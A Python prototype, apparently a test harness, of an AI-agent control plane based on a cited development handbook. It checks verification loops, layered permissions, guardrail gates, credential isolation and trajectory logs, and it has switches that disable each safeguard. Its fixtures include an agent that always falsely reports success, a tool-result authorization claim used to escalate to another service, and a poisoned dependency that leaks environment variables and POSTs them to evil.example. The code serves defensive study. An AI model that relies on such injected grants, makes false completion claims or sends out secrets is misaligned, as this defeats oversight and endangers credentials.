#!/usr/bin/env python3
"""ai_native_lab.py —— 《AI Native 研发范式实践手册》企业级 Harness 控制面的最小可运行原型。

它回答「机制是否自洽」，不回答「模型是否聪明」：材料中由 LLM 承担的角色（提补丁、
提工具调用、按 Spec 搜证）全部替换为**确定性脚本**，同一条命令永远给出同一份日志。

对照的一手材料（页码为手册印刷页码）：阿里巴巴《AI Native 研发范式实践手册》（2026-09）
p35–36 Harness 闭环 / p45 凭据边界 / p51–54 Identity & Policy / p55–58 Guardrail /
p60 Trajectory / p24 度量示例 SQL。

用法：
    uv run --no-project python ai_native_lab.py --selftest     # 全绿自证（含 X1 口径核验）
    uv run --no-project python ai_native_lab.py --break D3     # 单项破坏性实验
    uv run --no-project python ai_native_lab.py --break all    # D1..D6 全跑
"""

from __future__ import annotations

import argparse
import hashlib
import json
import sqlite3
import sys
from dataclasses import dataclass, field
from pathlib import Path

LAB = Path(__file__).resolve().parent / ".lab_out"


# ── 破坏性实验开关：默认全部为「完好」，每个实验只翻转其中一个 ──────────────────
@dataclass
class Switches:
    trust_self_report: bool = False  # D1 完成判据退回「信模型自报已修复」
    pep_trust_context: bool = False  # D2 PEP 采信模型上下文里携带的授权声明
    unknown_as_pass: bool = False  # D3 Guardrail 聚合时把 UNKNOWN 当 PASS
    bind_changeset: bool = True  # D4 放行前核对 ChangeSet 摘要（目标变更即作废）
    secret_in_env: bool = False  # D5 真实令牌直接写进 Sandbox 环境变量
    check_validity: bool = True  # D6 放行前核对 PASS 时效（Spec.validForSeconds）


SW = Switches()


# ── M5 Trajectory：Session → Task → Step → Outcome，其余机制都往这里记事（p60）──
@dataclass
class Trajectory:
    session: str
    steps: list = field(default_factory=list)
    outcomes: dict = field(default_factory=dict)

    def step(self, task: str, kind: str, **detail) -> None:
        self.steps.append({"task": task, "kind": kind, **detail})

    def outcome(self, task: str, result: str) -> None:
        self.outcomes[task] = result

    def complete(self) -> bool:
        tasks = {s["task"] for s in self.steps}
        return tasks == set(self.outcomes) and all(s.get("kind") for s in self.steps)


# ── M1 Harness 闭环：只认验证证据，不认「已修复」自报（p35–36）────────────────────
CANCEL_CASES = [
    (5, False, True),
    (5, True, False),
    (15, False, False),
]  # (分钟, 已发货, 可取消)
PATCHES = {
    "v1": lambda minutes, shipped: minutes <= 10,  # 漏了「未发货」条件
    "v2": lambda minutes, shipped: minutes <= 10 and not shipped,
}


def run_tests(patch: str) -> dict:
    """确定性测试：规则「创建 10 分钟内且未发货可取消」（p48 的虚构电商案例）。"""
    rule = PATCHES.get(patch, lambda minutes, shipped: False)
    failed = sum(rule(m, s) != want for m, s, want in CANCEL_CASES)
    return {
        "cmd": "pytest tests/test_cancel.py",
        "exit_code": 1 if failed else 0,
        "failed": failed,
    }


def scripted_patcher(task: str, attempt: int) -> tuple[str, str]:
    """替代模型：每轮给一个补丁，并**一律声称已修复**。"""
    if task == "cancel-rule":
        return ("v1" if attempt == 1 else "v2"), "已修复"
    return "v0", "已修复"  # 修不好的任务：补丁永远是错的


def harness_loop(task: str, tr: Trajectory, max_rounds: int = 3) -> dict:
    for attempt in range(1, max_rounds + 1):
        patch, claim = scripted_patcher(task, attempt)
        tr.step(task, "model_call", attempt=attempt, patch=patch, claim=claim)
        evidence = run_tests(patch)
        tr.step(task, "tool_call", cmd=evidence["cmd"], exit_code=evidence["exit_code"])
        done = claim == "已修复" if SW.trust_self_report else evidence["exit_code"] == 0
        if done:
            tr.outcome(task, "delivered")
            return {
                "status": "delivered",
                "rounds": attempt,
                "patch": patch,
                "evidence": evidence,
            }
    tr.outcome(task, "handoff")  # 多次验证失败 → 转交人工
    return {
        "status": "handoff",
        "rounds": max_rounds,
        "patch": patch,
        "evidence": evidence,
    }


# ── M2 Identity & Policy：有效权限取交集，PEP 只信已验证身份（p52–54）──────────────
CATALOG = {"order-svc": "test", "inventory-svc": "prod"}  # 已验证资源目录：服务 → 环境
CHALLENGE_ACTIONS = {"write_config"}  # 需补充授权（Challenge）的动作
LAYERS = {  # 有效权限 = 用户 ∩ Agent 能力上限 ∩ 平台策略 ∩ 本次委托 ∩ 运行时约束
    "user": {
        ("order-svc", "read"),
        ("order-svc", "write_config"),
        ("inventory-svc", "read"),
        ("inventory-svc", "write"),
    },
    "agent_cap": {
        ("order-svc", "read"),
        ("order-svc", "write_config"),
        ("inventory-svc", "read"),
        ("inventory-svc", "write"),
    },
    "platform": {
        ("order-svc", "read"),
        ("order-svc", "write_config"),
        ("inventory-svc", "read"),
    },
    "delegation": {
        ("order-svc", "read"),
        ("order-svc", "write_config"),
        ("inventory-svc", "read"),
    },
    "runtime": {
        ("order-svc", "read"),
        ("order-svc", "write_config"),
        ("inventory-svc", "read"),
    },
}
AGENT_CALLS = [
    {"service": "order-svc", "action": "read"},
    {"service": "order-svc", "action": "write_config"},
    # 模型把目标改成另一个服务，并引用工具返回值里「你已获授权」的声明（越权尝试）
    {
        "service": "inventory-svc",
        "action": "write",
        "ctx_grant": ["inventory-svc", "write"],
    },
]


def effective_permissions() -> set:
    perms = None
    for layer in LAYERS.values():
        perms = set(layer) if perms is None else perms & layer
    return perms


def pdp(target: str, action: str, perms: set) -> str:
    if (target, action) not in perms:
        return "deny"
    return "challenge" if action in CHALLENGE_ACTIONS else "allow"


def pep(call: dict, perms: set, tr: Trajectory, task: str) -> str:
    target, action = call["service"], call["action"]
    if target not in CATALOG:
        decision = "deny"
    else:
        granted = perms
        if SW.pep_trust_context and call.get("ctx_grant"):
            granted = perms | {tuple(call["ctx_grant"])}
        decision = pdp(target, action, granted)
    if decision == "challenge":  # 独立界面由人确认后自动重试；模型只看到「等待确认」
        tr.step(
            task, "state_change", challenge=f"{target}:{action}", confirmed_by="总工"
        )
        decision = "challenge→allow"
    tr.step(task, "tool_call", target=target, action=action, decision=decision)
    return decision


# ── M3 Guardrail：Spec@revision + ChangeSet 摘要 + 三态机械聚合（p55–58）──────────
SPEC = {
    "revision": "r3",
    "required": ["error_rate", "alerts", "latency"],
    "validForSeconds": 300,
}


def digest(obj) -> str:
    return hashlib.sha256(
        json.dumps(obj, sort_keys=True, ensure_ascii=False).encode()
    ).hexdigest()[:12]


def open_run(changeset: dict, at: int) -> dict:
    return {
        "spec": f"{SPEC['revision']}@{digest(SPEC)}",
        "changeset": digest(changeset),
        "at": at,
        "submissions": {},
    }


def scripted_investigator(run: dict, monitoring_up: bool) -> None:
    """替代 Agent：按 Spec 自选工具搜证，逐项提交三态结果与 Evidence。"""
    run["submissions"]["error_rate"] = {"state": "PASS", "evidence": "5xx 0.02% < 阈值"}
    run["submissions"]["alerts"] = {"state": "PASS", "evidence": "无活跃告警"}
    run["submissions"]["latency"] = (
        {"state": "PASS", "evidence": "p99 180ms"}
        if monitoring_up
        else {"state": "UNKNOWN", "evidence": "监控查询超时"}
    )


def aggregate(run: dict) -> str:
    states = [
        run["submissions"].get(c, {}).get("state", "MISSING") for c in SPEC["required"]
    ]
    if SW.unknown_as_pass:
        states = ["PASS" if s == "UNKNOWN" else s for s in states]
    return "PASS" if all(s == "PASS" for s in states) else "HOLD"


def release_resume(run: dict, current_changeset: dict, now: int) -> bool:
    """发布系统终检：门控 PASS、ChangeSet 摘要仍一致、结论未过期，才执行 resume（p56 第 5–6 步）。"""
    if aggregate(run) != "PASS":
        return False
    if SW.bind_changeset and run["changeset"] != digest(current_changeset):
        return False
    return not (SW.check_validity and now - run["at"] > SPEC["validForSeconds"])


def guardrail_night(tr: Trajectory) -> dict:
    """夜间四个批次（秒）：136 正常；137 取得 PASS 后目标被改；138 撞上监控故障；139 PASS 放了 10 分钟才用。"""
    resumed = {}
    for batch, monitoring_up, changed_to, checked_at, released_at in [
        (136, True, None, 0, 60),
        (137, True, "cluster-B", 300, 480),
        (138, False, None, 360, 420),
        (139, True, None, 300, 900),
    ]:
        task = f"resume-{batch}"
        changeset = {"batch": batch, "target": "cluster-A", "params": {"replicas": 3}}
        run = open_run(changeset, at=checked_at)
        scripted_investigator(run, monitoring_up)
        current = {**changeset, "target": changed_to} if changed_to else changeset
        resumed[batch] = release_resume(run, current, now=released_at)
        tr.step(
            task,
            "state_change",
            gate=aggregate(run),
            spec=run["spec"],
            changeset=run["changeset"],
        )
        tr.outcome(task, "resumed" if resumed[batch] else "held")
    return resumed


# ── M4 凭据边界：Sandbox 只见占位值，出站代理按规则注入（p45、p53）──────────────────
REAL_TOKEN = "ghp_REAL_7f3a"  # 只活在凭证代理里的长期凭证（示意值）
EGRESS_ALLOW = {"git.internal", "repo.maven.apache.org"}  # 默认拒绝出站，按任务放行
INJECT_RULES = [("git.internal", "/api/repos/", "GET")]


def sandbox_env() -> dict:
    return {
        "GIT_TOKEN": REAL_TOKEN if SW.secret_in_env else "__PLACEHOLDER__",
        "PATH": "/usr/bin",
    }


def egress_proxy(req: dict) -> dict:
    if req["host"] not in EGRESS_ALLOW:
        return {**req, "blocked": True, "auth": None}
    matched = any(
        req["host"] == h and req["path"].startswith(p) and req["method"] == m
        for h, p, m in INJECT_RULES
    )
    return {**req, "blocked": False, "auth": REAL_TOKEN if matched else None}


def sandbox_build(tr: Trajectory) -> dict:
    env = sandbox_env()
    build_log = f"deps> postinstall: collected env={json.dumps(env)}"  # 投毒依赖把环境变量打进日志
    exfil = egress_proxy({"host": "evil.example", "path": "/collect", "method": "POST"})
    legit = egress_proxy(
        {"host": "git.internal", "path": "/api/repos/order-svc", "method": "GET"}
    )
    tr.step("build", "tool_call", log=build_log, exfil_blocked=exfil["blocked"])
    tr.outcome("build", "done")
    return {
        "token_in_log": REAL_TOKEN in build_log,  # 日志会回流到模型上下文与可观测平台
        "exfil_blocked": exfil["blocked"],
        "legit_authorized": legit["auth"] == REAL_TOKEN,
    }


# ── X1 口径核验：按手册 p24「精简示例」SQL 原样重放，看 repo 维多对多 JOIN 的扇出 ─────
X1_SQL = """
WITH session_fact AS (SELECT session_id, user_id, repo, adopted_ai_lines, skill_cnt, mcp_cnt FROM cleaned_ai_sessions),
     code_fact AS (SELECT commit_id, repo, total_lines, ai_lines FROM cleaned_commits),
     change_fact AS (SELECT change_id, repo, has_ai_commit, failed, mttr FROM cleaned_changes),
     workitem_fact AS (SELECT workitem_id, related_change_id, lead_time FROM cleaned_workitems)
SELECT count(session_id), sum(adopted_ai_lines), sum(skill_cnt + mcp_cnt),
       avg(failed), avg(lead_time), count(change_id)
FROM session_fact
JOIN code_fact USING (repo)
JOIN change_fact USING (repo)
JOIN workitem_fact ON workitem_fact.related_change_id = change_fact.change_id
"""
X1_KEYS = [
    "ai_sessions",
    "ai_adopted_lines",
    "context_usage",
    "change_failure_rate",
    "delivery_cycle",
    "deploy_frequency",
]


def x1_fanout() -> dict:
    db = sqlite3.connect(":memory:")
    db.executescript("""
        CREATE TABLE cleaned_ai_sessions(session_id, user_id, repo, adopted_ai_lines, skill_cnt, mcp_cnt);
        CREATE TABLE cleaned_commits(commit_id, repo, total_lines, ai_lines);
        CREATE TABLE cleaned_changes(change_id, repo, has_ai_commit, failed, mttr);
        CREATE TABLE cleaned_workitems(workitem_id, related_change_id, lead_time);
        INSERT INTO cleaned_ai_sessions VALUES ('s1','u1','r1',10,1,0),('s2','u2','r1',20,0,1),('s3','u3','r2',5,1,1);
        INSERT INTO cleaned_commits VALUES ('c1','r1',50,10),('c2','r1',40,20),('c3','r1',30,0),('c4','r2',20,5);
        INSERT INTO cleaned_changes VALUES ('k1','r1',1,1,30),('k2','r1',1,0,0),('k3','r2',1,1,60);
        INSERT INTO cleaned_workitems VALUES ('w1','k1',3),('w2','k2',5),('w3','k3',10);
    """)
    naive = dict(zip(X1_KEYS, db.execute(X1_SQL).fetchone(), strict=True))
    one = lambda sql: db.execute(sql).fetchone()[0]  # noqa: E731
    truth = {  # 各事实表先各自聚合，再谈关联
        "ai_sessions": one("SELECT count(*) FROM cleaned_ai_sessions"),
        "ai_adopted_lines": one(
            "SELECT sum(adopted_ai_lines) FROM cleaned_ai_sessions"
        ),
        "context_usage": one(
            "SELECT sum(skill_cnt + mcp_cnt) FROM cleaned_ai_sessions"
        ),
        "change_failure_rate": one("SELECT avg(failed) FROM cleaned_changes"),
        "delivery_cycle": one("SELECT avg(lead_time) FROM cleaned_workitems"),
        "deploy_frequency": one("SELECT count(*) FROM cleaned_changes"),
    }
    return {"naive": naive, "truth": truth}


# ── 探针：跑一遍全部机制，返回可比较的观测量 ─────────────────────────────────────
def probe() -> dict:
    tr = Trajectory(session="night-shift")
    easy = harness_loop("cancel-rule", tr)
    hard = harness_loop("flaky-migration", tr)
    perms = effective_permissions()
    decisions = tuple(pep(call, perms, tr, "ops") for call in AGENT_CALLS)
    tr.outcome("ops", "done")
    resumed = guardrail_night(tr)
    cred = sandbox_build(tr)
    LAB.mkdir(exist_ok=True)
    (LAB / "trajectory.json").write_text(
        json.dumps(tr.__dict__, ensure_ascii=False, indent=2)
    )
    return {
        "M1 cancel-rule 交付补丁通过测试": run_tests(easy["patch"])["exit_code"] == 0,
        "M1 cancel-rule 状态/轮数": f"{easy['status']}/{easy['rounds']}",
        "M1 flaky-migration 状态": hard["status"],
        "M2 三次调用决策": decisions,
        "M2 跨服务越权写被执行": decisions[2] == "allow",
        "M3 resume 136/137/138/139": tuple(resumed[b] for b in (136, 137, 138, 139)),
        "M4 真实令牌出现在构建日志": cred["token_in_log"],
        "M4 外发请求被出站策略拦下": cred["exfil_blocked"],
        "M4 合法请求获注入凭证": cred["legit_authorized"],
        "M5 轨迹完整（每个 Task 都有 Outcome）": tr.complete(),
        "M5 轨迹步数": len(tr.steps),
    }


EXPECTED = {
    "M1 cancel-rule 交付补丁通过测试": True,
    "M1 cancel-rule 状态/轮数": "delivered/2",
    "M1 flaky-migration 状态": "handoff",
    "M2 三次调用决策": ("allow", "challenge→allow", "deny"),
    "M2 跨服务越权写被执行": False,
    "M3 resume 136/137/138/139": (True, False, False, False),
    "M4 真实令牌出现在构建日志": False,
    "M4 外发请求被出站策略拦下": True,
    "M4 合法请求获注入凭证": True,
    "M5 轨迹完整（每个 Task 都有 Outcome）": True,
    "M5 轨迹步数": 19,
}


def selftest() -> int:
    got = probe()
    for key, want in EXPECTED.items():
        assert got[key] == want, f"{key}: 期望 {want!r}，实得 {got[key]!r}"
        print(f"  ✔ {key} = {got[key]}")
    x1 = x1_fanout()
    assert x1["truth"] == {
        "ai_sessions": 3,
        "ai_adopted_lines": 35,
        "context_usage": 4,
        "change_failure_rate": 2 / 3,
        "delivery_cycle": 6.0,
        "deploy_frequency": 3,
    }, x1["truth"]
    assert (
        x1["naive"]["ai_sessions"] == 13 and x1["naive"]["ai_adopted_lines"] == 185
    ), x1["naive"]
    print("\n  X1 手册 p24 示例 SQL 重放（真值 → 示例 SQL 实得）：")
    for key in X1_KEYS:
        t, n = x1["truth"][key], x1["naive"][key]
        print(f"    {key:<20} {t:>7.3f} → {n:>7.3f}  （×{n / t:.2f}）")
    print("\nSELFTEST PASSED ✔")
    return 0


EXPERIMENTS = {
    "D1": ("拔掉验证：完成判据改信自报", {"trust_self_report": True}),
    "D2": ("PEP 采信上下文里的授权声明", {"pep_trust_context": True}),
    "D3": ("三态聚合把 UNKNOWN 当 PASS", {"unknown_as_pass": True}),
    "D4": ("放行前不核对 ChangeSet 摘要", {"bind_changeset": False}),
    "D5": ("真实令牌写进 Sandbox 环境变量", {"secret_in_env": True}),
    "D6": ("放行前不核对 PASS 时效", {"check_validity": False}),
}


def run_break(name: str) -> None:
    label, changes = EXPERIMENTS[name]
    base = probe()
    for key, value in changes.items():
        setattr(SW, key, value)
    try:
        broken = probe()
    finally:
        for key in changes:
            setattr(SW, key, getattr(Switches(), key))
    print(f"\n== {name} · {label} ==")
    print("  改动：" + "；".join(f"Switches.{k} = {v}" for k, v in changes.items()))
    for key in base:
        if base[key] != broken[key]:
            print(f"  退化：{key}  {base[key]}  →  {broken[key]}")
    if all(base[k] == broken[k] for k in base):
        print("  （无可观测差异）")


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--selftest", action="store_true")
    parser.add_argument("--break", dest="brk", help="D1..D6 或 all")
    args = parser.parse_args()
    if args.brk:
        for name in list(EXPERIMENTS) if args.brk == "all" else [args.brk]:
            run_break(name)
        return 0
    return selftest()


if __name__ == "__main__":
    sys.exit(main())
